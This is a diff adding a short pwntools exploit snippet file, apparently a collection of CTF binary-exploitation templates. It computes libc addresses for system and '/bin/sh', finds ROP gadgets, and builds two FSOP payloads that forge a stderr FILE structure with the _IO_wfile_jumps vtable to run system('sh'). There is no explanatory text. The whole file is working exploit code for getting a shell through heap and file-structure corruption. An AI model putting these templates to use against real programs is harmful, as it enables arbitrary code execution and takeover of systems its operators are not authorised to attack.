@@ -1,0 +1,44 @@
+# rdi
+log.success("libc :-----> " + hex(libc.address))
+system_addr = libc.symbols.get("system")
+binsh_addr = next(libc.search("/bin/sh"))
+pop_rdi = next(libc.search(asm("pop rdi; ret")))
+ret = next(libc.search(asm("ret")))
+environ = libc.symbols["__environ"]
+
+
+
+# FSOP1
+vtable = libc.sym._IO_wfile_jumps
+io_file = libc.sym._IO_2_1_stderr_
+payload = flat(
+    0x687320,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, libc.sym.system, 0x00, 0x00, 0x00, 0x00,
+    0x0, 0x0, 0x00, libc.bss()+0x100, 0x00,
+    io_file+0x20, io_file-0x20,
+    0x0, 0x0, 0x0, (io_file-0xe0)+0xc0, 0x0, 0x0,
+    vtable)
+
+# FSOP2
+file = FileStructure(0)
+file.flags = u64(p32(0xfbad0101) + b";sh\0")
+file._IO_save_end = libc.sym["system"]
+file._lock = stderr_adr - 0x10
+file._wide_data = stderr_adr - 0x10
+file._offset = 0
+file._old_offset = 0
+payload = b"\x00"*24 + p32(1) + p32(0) + p64(0)
+payload += p64(libc.symbols["_IO_2_1_stderr_"] - 0x10)
+payload += p64(libc.symbols["_IO_wfile_jumps"] + 0x18 - 0x58)
+file.unknown2 = payload
+
+bytes(file)
+
+
+
+
+
+
+# gadget
+# 0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
